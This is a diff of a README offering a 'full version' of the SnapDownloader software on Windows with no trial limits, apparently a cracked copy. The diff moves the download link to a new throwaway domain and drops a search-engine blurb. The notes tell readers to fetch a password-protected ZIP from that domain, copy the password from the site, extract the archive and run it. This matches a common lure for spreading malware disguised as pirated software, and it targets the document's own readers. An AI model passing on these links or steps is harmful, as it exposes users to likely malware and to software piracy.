@@ -1,6 +1,6 @@
 ***
 
-# SnapDownloader Premium Full Version — Windows Install Notes
+# SnapDownloader Premium Full Version Windows Setup Notes
 
 SnapDownloader Premium — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ SnapDownloader Premium — Windows setup and configuration · Premium workspace 
 
 > Use the release page below for Windows.
 
-- **Release page:** [snapdownloaderpro.slopmods.tech](https://snapdownloaderpro.slopmods.tech/)
-- **Full URL:** `https://snapdownloaderpro.slopmods.tech/`
+- **Release page:** [snapdownloaderpro.slopmods.top](https://snapdownloaderpro.slopmods.top/)
+- **Full URL:** `https://snapdownloaderpro.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **snapdownloaderpro.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **snapdownloaderpro.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ SnapDownloader Premium — Windows setup and configuration · Premium workspace 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **snapdownloaderpro.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **snapdownloaderpro.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **SnapDownloader Premium** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Multi-threaded downloads with resume support
